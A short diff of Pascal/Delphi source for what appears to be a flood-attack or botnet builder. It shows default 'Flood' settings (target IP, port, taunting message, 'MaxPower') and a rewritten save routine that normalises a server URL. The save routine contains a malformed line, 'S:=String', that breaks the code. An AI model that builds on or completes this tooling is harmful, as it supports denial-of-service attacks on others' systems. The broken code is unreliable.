@@ -236,7 +236,7 @@ Begin
       WriteString('Flood', 'DefaultIP', '1.1.1.1');
       WriteInteger('Flood', 'DefaultPort', 80);
       WriteString('Flood', 'Message', 'My dreaming ends... Your nightmare begins!');
-      WriteInteger('Flood', 'MaxPower', 1); // 1 = ... all hell breaks loose
+      WriteInteger('Flood', 'MaxPower', 1); // 1 = ... all hell breaks loose.
 
       SCast:=TStringList.Create;
       GetStrings(SCast);
@@ -671,9 +671,25 @@ begin
 end;
 
 procedure TBuildForm.SaveButtonClick(Sender: TObject);
+var
+  S: String;
+
+procedure RemoveEnd(var S: String; const _End: String);
+Begin
+  if RightStr(S, Length(_End))=_End then
+    Delete(S, Length(S)-Length(_End)+1, Length(_End));
+end;
+
 begin
-  SaveSettings;
-  ShowMessage('Settings saved! Please restart the builder for the changes to take effect!');
+  if Pos('http', ServerEdit.Text)>0 then Begin
+    S:=LowerCase(ServerEdit.Text);
+    S:=StringReplace(S, 'https://', 'http://', []);
+    S:=String
+    if RightStr(S, 1)='/' then Delete(S, Length(S), 1);
+    ServerEdit.Text:=S;
+    SaveSettings;
+    ShowMessage('Settings saved! Please restart the builder for the changes to take effect!');
+  end;
 end;
 
 procedure TBuildForm.ScanButtonClick(Sender: TObject);
